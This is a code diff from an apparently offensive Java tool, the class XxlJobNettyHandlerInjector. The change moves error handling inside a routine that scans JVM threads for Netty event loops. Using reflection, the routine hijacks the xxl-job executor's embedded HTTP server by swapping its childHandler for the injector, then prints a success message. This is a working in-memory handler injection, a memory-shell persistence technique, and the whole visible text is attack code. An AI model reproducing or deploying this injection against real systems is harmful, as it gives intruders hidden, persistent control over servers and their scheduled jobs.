@@ -86,23 +86,20 @@ public class XxlJobNettyHandlerInjector extends ChannelInitializer<SocketChannel
         for (Thread thread : threads) {
             if (thread != null && thread.getName().contains("nioEventLoopGroup")) {
                 Object target;
-
                 try {
                     target = getFieldValue(getFieldValue(getFieldValue(thread, "target"), "runnable"), "val$eventExecutor");
-                } catch (Exception e) {
-                    continue;
-                }
-
-                if (target.getClass().getName().endsWith("NioEventLoop")) {
-                    HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
-                    if (!set.isEmpty()) {
-                        Object keys = set.toArray()[0];
-                        Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
-                        Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
-                        setFieldValue(embedHttpServerHandler, "childHandler", this);
-                        System.out.println("xxl-job NettyHandler inject successful");
-                        break;
+                    if (target.getClass().getName().endsWith("NioEventLoop")) {
+                        HashSet<?> set = (HashSet<?>) getFieldValue(getFieldValue(target, "unwrappedSelector"), "keys");
+                        if (!set.isEmpty()) {
+                            Object keys = set.toArray()[0];
+                            Object pipeline = getFieldValue(getFieldValue(keys, "attachment"), "pipeline");
+                            Object embedHttpServerHandler = getFieldValue(getFieldValue(getFieldValue(pipeline, "head"), "next"), "handler");
+                            setFieldValue(embedHttpServerHandler, "childHandler", this);
+                            System.out.println("xxl-job NettyHandler inject successful");
+                            break;
+                        }
                     }
+                } catch (Exception ignored) {
                 }
             }
         }
